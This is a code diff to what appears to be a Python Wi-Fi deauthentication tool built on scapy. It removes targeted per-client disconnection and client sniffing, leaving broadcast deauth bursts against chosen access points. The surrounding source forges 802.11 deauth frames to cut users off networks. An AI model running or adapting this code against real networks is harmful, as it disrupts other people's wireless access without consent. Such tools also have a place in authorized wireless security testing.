@@ -9,8 +9,7 @@ import threading  # leave it
 
 from typing import Dict, Generator, List, Union
 
-from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, \
-    Dot11QoS, Dot11Deauth, Dot11
+from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11Deauth, Dot11
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
@@ -41,12 +40,12 @@ class Interceptor:
     _ABORT = False
     _PRINT_STATS_INTV = 1
     _DEAUTH_INTV = 0.100  # 100[ms]
-    _DEAUTH_BURST = 5  # consecutive broadcast deauths per AP per loop (when no clients are known)
+    _DEAUTH_BURST = 5  # consecutive broadcast deauths per AP per loop
     _CH_SNIFF_TO = 2
     _SSID_STR_PAD = 42  # total len 80
 
     def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
-                 ssid_name, bssid_addr, custom_client_macs, custom_channels, deauth_all_channels, autostart, debug_mode):
+                 ssid_name, bssid_addr, custom_channels, deauth_all_channels, autostart, debug_mode):
         self.interface = net_iface
 
         self._max_consecutive_failed_send_lim = 5 / Interceptor._DEAUTH_INTV  # fails to send for 5 consecutive seconds
@@ -81,14 +80,10 @@ class Interceptor:
         self.log_debug(f"Selected custom ssid name: {self._custom_ssid_name}")
         self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
         self.log_debug(f"Selected custom bssid addr: {self._custom_ssid_name}")
-        self._custom_target_client_mac: Union[List[str], None] = self.parse_custom_client_mac(custom_client_macs)
-        self.log_debug(f"Selected target client mac addrs: {self._custom_target_client_mac}")
         self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
-        self.log_debug(f"Selected target client channels: {self._custom_target_client_mac}")
+        self.log_debug(f"Selected target channels: {self._custom_target_ap_channels}")
 
         self._custom_target_ap_last_ch = 0  # to avoid overlapping
-        self._midrun_output_buffer: List[str] = list()
-        self._midrun_output_lck = threading.RLock()
 
         self._deauth_all_channels = deauth_all_channels
 
@@ -122,25 +117,6 @@ class Interceptor:
     def verify_mac_addr(mac_addr: str) -> str:
         RandMAC(mac_addr)
         return mac_addr
-
-    @staticmethod
-    def parse_custom_client_mac(client_mac_addrs: Union[None, str]) -> List[str]:
-        custom_client_mac_list = list()
-        if client_mac_addrs is not None:
-            for mac in client_mac_addrs.split(','):
-                try:
-                    custom_client_mac_list = list()
-                    custom_client_mac_list.append(Interceptor.verify_mac_addr(mac))
-                except Exception as exc:
-                    print_error(f"Invalid custom client mac address -> {mac}")
-                    raise Exception("Bad custom client mac address")
-
-        if custom_client_mac_list:
-            print_info(f"Disabling broadcast deauth, attacking custom clients instead: {custom_client_mac_list}")
-        else:
-            print_info(f"No custom clients selected, enabling broadcast deauth and attacking all connected clients")
-
-        return custom_client_mac_list
 
     def parse_custom_channels(self, channel_list: Union[None, str]):
         ch_list = list()
@@ -214,8 +190,6 @@ class Interceptor:
                 self._all_ssids[band_type][ap_mac].add_channel(pkt_ch if pkt_ch in self._channel_range else self._current_channel_num)
                 if self._custom_ssid_name_is_set():
                     self._custom_target_ap_last_ch = self._all_ssids[band_type][ap_mac].channel
-            else:
-                self._clients_sniff_cb(pkt)  # pass forward to find potential clients
         except Exception as exc:
             pass
 
@@ -312,47 +286,6 @@ class Interceptor:
     def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
         return f"{ssid.ljust(Interceptor._SSID_STR_PAD - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(Interceptor._SSID_STR_PAD // 2, ' ')}{mcaddr}"
 
-    def _clients_sniff_cb(self, pkt):
-        try:
-            if self._packet_confirms_client(pkt):
-                ap_mac = str(pkt.addr3)
-                c_mac = pkt.addr1
-                for ssid in self._target_ssids:
-                    if ap_mac == ssid.mac_addr and c_mac not in [BD_MACADDR, ssid.mac_addr] \
-                            and c_mac not in ssid.clients:
-                        ssid.clients.append(c_mac)
-                        add_to_target_list = len(self._custom_target_client_mac) == 0 or c_mac in self._custom_target_client_mac
-                        with self._midrun_output_lck:
-                            self._midrun_output_buffer.append(f"Found new client {BOLD}{c_mac}{RESET} for "
-                                                              f"{BOLD}{ssid.name}{RESET},"
-                                                              f" adding to target list -> "
-                                                              f"{GREEN if add_to_target_list else RED}{add_to_target_list}{RESET}")
-        except:
-            pass
-
-    def _print_midrun_output(self):
-        bf_sz = len(self._midrun_output_buffer)
-        with self._midrun_output_lck:
-            for output in self._midrun_output_buffer:
-                print_cmd(output)
-            if bf_sz > 0:
-                printf(DELIM, end="\n")
-                bf_sz += 1
-        return bf_sz
-
-    @staticmethod
-    def _packet_confirms_client(pkt):
-        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
-               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
-               pkt.haslayer(Dot11QoS)
-
-    def _listen_for_clients(self):
-        print_info(f"Setting up a listener for new clients...")
-        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: Interceptor._ABORT is True)
-
-    def _get_target_clients(self, ssid: SSID) -> List[str]:
-        return self._custom_target_client_mac or ssid.clients
-
     def _get_l2_socket(self):
         if self._l2_sock is None:
             self._l2_sock = conf.L2socket(iface=self.interface)
@@ -372,15 +305,8 @@ class Interceptor:
                         # hop to the target's channel before attacking it (unless channel iteration is on)
                         if not self._deauth_all_channels and self._current_channel_num != ssid.channel:
                             self._set_channel(ssid.channel)
-                        ap_mac = ssid.mac_addr
-                        target_clients = self._get_target_clients(ssid)
-                        for client_mac in target_clients:
-                            self._send_deauth_client(ap_mac, client_mac)
-                        if not self._custom_target_client_mac:
-                            # burst broadcast deauths when no clients are known yet,
-                            # keeps per-AP packet density when rotating multiple targets
-                            self._send_deauth_broadcast(ap_mac,
-                                                        burst=1 if target_clients else Interceptor._DEAUTH_BURST)
+                        # broadcast-only deauth burst, keeps per-AP packet density when rotating multiple targets
+                        self._send_deauth_broadcast(ssid.mac_addr, burst=Interceptor._DEAUTH_BURST)
                     failed_attempts_ctr = 0  # reset counter
                 except Exception as exc:
                     failed_attempts_ctr += 1
@@ -396,15 +322,6 @@ class Interceptor:
                 except Exception:
                     pass
                 self._l2_sock = None
-
-    def _send_deauth_client(self, ap_mac: str, client_mac: str):
-        sock = self._get_l2_socket()
-        sock.send(RadioTap() /
-                  Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
-                  Dot11Deauth(reason=7))
-        sock.send(RadioTap() /
-                  Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
-                  Dot11Deauth(reason=7))
 
     def _send_deauth_broadcast(self, ap_mac: str, burst: int = 1):
         sock = self._get_l2_socket()
@@ -426,7 +343,7 @@ class Interceptor:
         printf(f"{DELIM}\n")
 
         threads = list()
-        for action in [self._run_deauther, self._listen_for_clients, self.report_status]:
+        for action in [self._run_deauther, self.report_status]:
             t = Thread(target=action, args=tuple())
             t.start()
             threads.append(t)
@@ -439,7 +356,6 @@ class Interceptor:
         printf(f"{DELIM}\n")
 
         while not Interceptor._ABORT:
-            buffer_sz = self._print_midrun_output()
             lines_printed = 0
             if len(self._target_ssids) == 1:
                 ssid = self._target_ssids[0]
@@ -454,16 +370,13 @@ class Interceptor:
                     print_info(f"  {ssid.name.ljust(Interceptor._SSID_STR_PAD - 8, ' ')}"
                                f"{str(ssid.channel).ljust(5, ' ')}{ssid.mac_addr}")
                     lines_printed += 1
-            total_clients = len(self._custom_target_client_mac) if self._custom_target_client_mac \
-                else sum(len(ssid.clients) for ssid in self._target_ssids)
             print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
-            print_info(f"Target clients{BOLD}{str(total_clients).rjust(80 - 18, ' ')}{RESET}")
             print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
-            lines_printed += 3
+            lines_printed += 2
             sleep(Interceptor._PRINT_STATS_INTV)
             if Interceptor._ABORT:  # might change while sleeping
                 break
-            clear_line(lines_printed + 1 + buffer_sz)
+            clear_line(lines_printed + 1)
 
     def log_debug(self, msg: str):
         if self._debug_mode:
@@ -522,9 +435,6 @@ def main():
                         action='store', default=None, dest="custom_ssid", required=False)
     parser.add_argument('-b', '--bssid', help='custom BSSID address (case-insensitive)', metavar="bssid_addr",
                         action='store', default=None, dest="custom_bssid", required=False)
-    parser.add_argument('--clients', help='MAC addresses of target clients to disconnect,'
-                                          ' separated by a comma (i.e -> 00:1A:2B:3C:4D:5G,00:1a:2b:3c:4d:5e)', metavar="client_mac_addrs",
-                        action='store', default=None, dest="custom_client_macs", required=False)
     parser.add_argument('-c', '--channels',
                         help='custom channels to scan / de-auth, separated by a comma (i.e -> 1,3,4)',
                         metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
@@ -543,7 +453,6 @@ def main():
                            kill_networkmanager=pargs.kill_networkmanager,
                            ssid_name=pargs.custom_ssid,
                            bssid_addr=pargs.custom_bssid,
-                           custom_client_macs=pargs.custom_client_macs,
                            custom_channels=pargs.custom_channels,
                            deauth_all_channels=pargs.deauth_all_channels,
                            autostart=pargs.autostart,
